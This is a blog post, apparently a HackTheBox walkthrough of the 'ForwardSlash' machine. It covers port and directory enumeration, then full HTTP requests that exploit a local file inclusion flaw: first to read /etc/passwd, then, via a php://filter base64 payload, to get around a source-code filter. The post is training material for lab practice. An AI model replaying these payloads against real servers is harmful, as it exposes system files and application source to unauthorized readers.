<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>ForwardSlash | yassine</title><meta name="generator" content="Jekyll v4.1.1" /><meta property="og:title" content="ForwardSlash" /><meta name="author" content="Mohammad YASSINE" /><meta property="og:locale" content="en_US" /><meta name="description" content="ForwardSlash from HackTheBox" /><meta property="og:description" content="ForwardSlash from HackTheBox" /><link rel="canonical" href="https://0xyassine.github.io//posts/ForwardSlash/" /><meta property="og:url" content="https://0xyassine.github.io//posts/ForwardSlash/" /><meta property="og:site_name" content="yassine" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-09T00:00:00+03:00" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"ForwardSlash from HackTheBox","author":{"@type":"Person","name":"Mohammad YASSINE"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://0xyassine.github.io//posts/ForwardSlash/"},"@type":"BlogPosting","url":"https://0xyassine.github.io//posts/ForwardSlash/","headline":"ForwardSlash","dateModified":"2020-05-09T00:00:00+03:00","datePublished":"2020-05-09T00:00:00+03:00","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">yassine</a></div><div id="site-subtitle" class="font-italic">Pentester | CyberSec analyst .</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.facebook.com/mouhamed.yassin.90" target="_blank"> <i class="fab fa-facebook-alt"><b><font color="orange">F</font></b></i> </a> <a href="https://www.linkedin.com/in/mohammad-yassine-8b84041a5/" target="_blank"> <i class="fab fa-linked-alt"><b><font color="orange">L</font></b></i> </a> <a href="https://www.hackthebox.eu/home/users/profile/143843" target="_blank"> <i class="fab fa-linked-alt"><b><font color="orange">H</font></b></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>ForwardSlash</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>ForwardSlash</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Sat, May 9, 2020, 12:00 AM +0300"> May 9, 2020 <i class="unloaded">2020-05-09T00:00:00+03:00</i> </span> by <span class="author"> Mohammad YASSINE </span></div><div> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, May 31, 2020, 6:05 PM +0300"> May 31, 2020 <i class="unloaded">2020-05-31T18:05:38+03:00</i> </span></div></div><div class="post-content"><h1 id="forwardslash-from-hackthebox">ForwardSlash from HackTheBox</h1><p><br /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/539bc8e4-92d5-11ea-bb37-0242ac130002-forward/info.jpg" alt="info" /></p><p><br /> Good box with new bypassing techniques and simple cryto …<br /></p><blockquote><p><strong>Note</strong> : add forwardslash.htb to your hosts file</p></blockquote><h2 id="nmap-scan">nmap scan</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap -sV -sC forwardslash.htb -v
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Backslash Gang
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>I can see a web port open (port 80),let’s check the content. <br /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/539bc8e4-92d5-11ea-bb37-0242ac130002-forward/main.jpg" alt="info" /></p><p><br /> Running gobuster , maybe i can find some useful pages and files… <br /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://forwardslash.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.183
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/05/06 14:20:30 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/index.php (Status: 302)
/index.php (Status: 302)
/note.txt (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/06 14:21:33 Finished
===============================================================
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">note.txt</code> seem interesting so let’s see the content of <code class="language-plaintext highlighter-rouge">http://forwardslash.htb/note.txt</code><br /></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/539bc8e4-92d5-11ea-bb37-0242ac130002-forward/note.jpg" alt="info" /></p><p>this <code class="language-plaintext highlighter-rouge">note.txt</code> show me two useful info : <code class="language-plaintext highlighter-rouge">backup</code> and <code class="language-plaintext highlighter-rouge">chev</code> , so i guess there is a backup website<br /> I enumerated <code class="language-plaintext highlighter-rouge">subdomains</code> with <code class="language-plaintext highlighter-rouge">wfuzz</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wfuzz -c -u http://forwardslash.htb/ -w /usr/share/amass/wordlists/subdomains-top1mil-20000.txt --hc 404,400 -H "Host:FUZZ.forwardslash.htb" --hw 0
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                      
===================================================================

000000055:   302        0 L      6 W      33 Ch       "backup"                                                                                                                     
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">backup</code> found , i can access <code class="language-plaintext highlighter-rouge">backup.forwardslash.htb</code> but first add this subdomain to the <code class="language-plaintext highlighter-rouge">hosts</code> file</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s2">"10.10.10.183	backup.forwardslash.htb &gt;&gt; /etc/hosts"</span>
</pre></table></code></div></div><p>running gobuster in this subdomain</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gobuster dir -u http://backup.forwardslash.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt
[+] Timeout:        10s
===============================================================
2020/05/06 14:51:26 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/api.php (Status: 200)
/config.php (Status: 200)
/dev (Status: 301)
/environment.php (Status: 302)
/index.php (Status: 302)
/index.php (Status: 302)
/login.php (Status: 200)
/logout.php (Status: 302)
/register.php (Status: 200)
/server-status (Status: 403)
/welcome.php (Status: 302)
===============================================================
2020/05/06 14:52:38 Finished
===============================================================
</pre></table></code></div></div><p>access to <code class="language-plaintext highlighter-rouge">/dev</code> is forbidden , i tried the <code class="language-plaintext highlighter-rouge">login</code> page <br /></p><blockquote><p><strong>Note</strong>: running gobuster against <code class="language-plaintext highlighter-rouge">http://backup.forwardslash.htb/dev</code> show me <code class="language-plaintext highlighter-rouge">index.php</code> page</p></blockquote><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/539bc8e4-92d5-11ea-bb37-0242ac130002-forward/note.jpg" alt="info" /></p><p>i checked all options , but the most interesting one is <code class="language-plaintext highlighter-rouge">Change Your Profile Picture</code> <br /> it has an <code class="language-plaintext highlighter-rouge">URL:</code> input and <code class="language-plaintext highlighter-rouge">submit</code> button but they are <code class="language-plaintext highlighter-rouge">disabled</code> , i can enable them from <code class="language-plaintext highlighter-rouge">console</code> and <code class="language-plaintext highlighter-rouge">intercept</code> the request with <code class="language-plaintext highlighter-rouge">burp</code><br /></p><p><code class="language-plaintext highlighter-rouge">right click --&gt; Inspect Element</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://0xprashant.github.io/0xyassine/539bc8e4-92d5-11ea-bb37-0242ac130002-forward/enable.jpg" alt="info" /></p><p>just remove the <code class="language-plaintext highlighter-rouge">disabled=""</code> from the <code class="language-plaintext highlighter-rouge">URL:</code> and submit <code class="language-plaintext highlighter-rouge">button</code> then <code class="language-plaintext highlighter-rouge">intercept</code> the request with <code class="language-plaintext highlighter-rouge">burp</code> and send it to <code class="language-plaintext highlighter-rouge">repeater</code> <br /> request:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Connection: close
Cookie: PHPSESSID=eiski0kes1l3enqhgvchcdid01
Upgrade-Insecure-Requests: 1

url=aa
</pre></table></code></div></div><p>response:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Date: Wed, 06 May 2020 11:48:06 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 689
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Welcome&lt;/title&gt;
    &lt;link rel="stylesheet" href="bootstrap.css"&gt;
    &lt;style type="text/css"&gt;
        body{ font: 14px sans-serif; text-align: center; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="page-header"&gt;
        &lt;h1&gt;Change your Profile Picture!&lt;/h1&gt;
	&lt;font style="color:red"&gt;This has all been disabled while we try to get back on our feet after the hack.&lt;br&gt;&lt;b&gt;-Pain&lt;/b&gt;&lt;/font&gt;
    &lt;/div&gt;
&lt;form action="/profilepicture.php" method="post"&gt;
        URL:
        &lt;input type="text" name="url" disabled style="width:600px"&gt;&lt;br&gt;
        &lt;input style="width:200px" type="submit" value="Submit" disabled&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><h2 id="local-file-inclusion">Local File Inclusion</h2><p>i tested for sql injection in this parameter but not working , then i tried a simple LFI by setting the url to <code class="language-plaintext highlighter-rouge">url=/etc/passwd</code></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Connection: close
Cookie: PHPSESSID=eiski0kes1l3enqhgvchcdid01
Upgrade-Insecure-Requests: 1

url=/etc/passwd
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Date: Wed, 06 May 2020 11:50:41 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2349
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Welcome&lt;/title&gt;
    &lt;link rel="stylesheet" href="bootstrap.css"&gt;
    &lt;style type="text/css"&gt;
        body{ font: 14px sans-serif; text-align: center; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="page-header"&gt;
        &lt;h1&gt;Change your Profile Picture!&lt;/h1&gt;
	&lt;font style="color:red"&gt;This has all been disabled while we try to get back on our feet after the hack.&lt;br&gt;&lt;b&gt;-Pain&lt;/b&gt;&lt;/font&gt;
    &lt;/div&gt;
&lt;form action="/profilepicture.php" method="post"&gt;
        URL:
        &lt;input type="text" name="url" disabled style="width:600px"&gt;&lt;br&gt;
        &lt;input style="width:200px" type="submit" value="Submit" disabled&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
</pre></table></code></div></div><p>i was able to read the content of <code class="language-plaintext highlighter-rouge">/etc/passwd</code> , now i can try to read the content of <code class="language-plaintext highlighter-rouge">backup.forwardslash.htb/dev/index.php</code> <br /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Connection: close
Cookie: PHPSESSID=eiski0kes1l3enqhgvchcdid01
Upgrade-Insecure-Requests: 1

url=/var/www/backup.forwardslash.htb/dev/index.php
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Date: Wed, 06 May 2020 12:17:13 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 723
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;!DOCTYPE html&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;title&gt;Welcome&lt;/title&gt;
    &lt;link rel="stylesheet" href="bootstrap.css"&gt;
    &lt;style type="text/css"&gt;
        body{ font: 14px sans-serif; text-align: center; }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;div class="page-header"&gt;
        &lt;h1&gt;Change your Profile Picture!&lt;/h1&gt;
	&lt;font style="color:red"&gt;This has all been disabled while we try to get back on our feet after the hack.&lt;br&gt;&lt;b&gt;-Pain&lt;/b&gt;&lt;/font&gt;
    &lt;/div&gt;
&lt;form action="/profilepicture.php" method="post"&gt;
        URL:
        &lt;input type="text" name="url" disabled style="width:600px"&gt;&lt;br&gt;
        &lt;input style="width:200px" type="submit" value="Submit" disabled&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
Permission Denied; not that way ;)
</pre></table></code></div></div><p>i got <code class="language-plaintext highlighter-rouge">Permission Denied; not that way ;)</code> so there is a <code class="language-plaintext highlighter-rouge">php filter</code> .After searching , i was able to bypass it with <code class="language-plaintext highlighter-rouge">base64</code> encoding</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>POST /profilepicture.php HTTP/1.1
Host: backup.forwardslash.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://backup.forwardslash.htb/profilepicture.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Connection: close
Cookie: PHPSESSID=eiski0kes1l3enqhgvchcdid01
Upgrade-Insecure-Requests: 1

url=php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/dev/index.php
